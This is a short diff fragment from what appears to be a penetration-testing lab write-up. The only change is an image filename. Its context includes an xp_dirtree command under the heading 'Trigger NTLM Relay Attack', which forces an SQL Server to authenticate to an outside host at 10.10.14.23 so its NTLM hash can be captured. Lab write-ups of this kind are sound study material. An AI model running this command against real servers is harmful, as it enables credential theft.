@@ -286,7 +286,7 @@ Trigger NTLM Relay Attack:
 xp_dirtree '\\10.10.14.23\any\thing'
 ```
 
-<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (9) (6).png" alt=""><figcaption></figcaption></figure>
 
 #### Sequel User NTLM Hash
 
